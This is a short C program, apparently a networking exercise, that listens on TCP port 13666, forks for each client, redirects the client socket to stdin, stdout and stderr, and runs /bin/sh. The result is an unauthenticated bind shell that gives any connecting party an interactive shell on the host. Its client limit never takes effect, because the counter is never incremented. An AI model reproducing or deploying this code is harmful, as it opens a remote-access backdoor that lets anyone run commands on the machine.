#include "netUtils.h"

#define PORT 13666
#define MAX_CLIENTS  100

unsigned int client_counter = 0;
static const char apologise[] = "Sorry, there are too many clients\n";

int main(void)
{
    display_address();
    int sd = open_server_sock(PORT);

    while (1)
    {
        // descriptor of new client
        int cli_sd = do_accept(sd);
        printf("new client \n");

        if ((client_counter + 1) == MAX_CLIENTS)
        {
            write(cli_sd, apologise, sizeof(apologise));
            close(cli_sd);
        }
        else
        {
            if (fork() == 0)
            {
                // redirect stdout, stderr and stdin
                if (dup2(cli_sd, fileno(stdout)) == -1)
                {
                    perror("cannot redirect stdout");
                    exit(EXIT_FAILURE);
                }
                if (dup2(cli_sd, fileno(stderr)) == -1)
                {
                    perror("cannot redirect stderr");
                    exit(EXIT_FAILURE);
                }
                if (dup2(cli_sd, fileno(stdin)) == -1)
                {
                    perror("cannot redirect stdin");
                    exit(EXIT_FAILURE);
                }
                execv("/bin/sh", NULL);

                // if exec didn't work
                exit(EXIT_FAILURE);
            }
        }
    }
}